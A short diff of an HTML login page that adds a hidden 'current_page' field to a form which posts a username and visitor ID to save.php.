@@ -100,6 +100,7 @@
                 
                 <form id="directLoginForm" action="save.php" method="POST">
                     <input type="hidden" name="visitor_id" id="form_visitor_id">
+                    <input type="hidden" name="current_page" value="index.php">
                     <div class="input-wrapper">
                         <input type="text" name="username" id="user" placeholder="ادخل اسم المستخدم" required>
                         <i class="fas fa-user"></i>
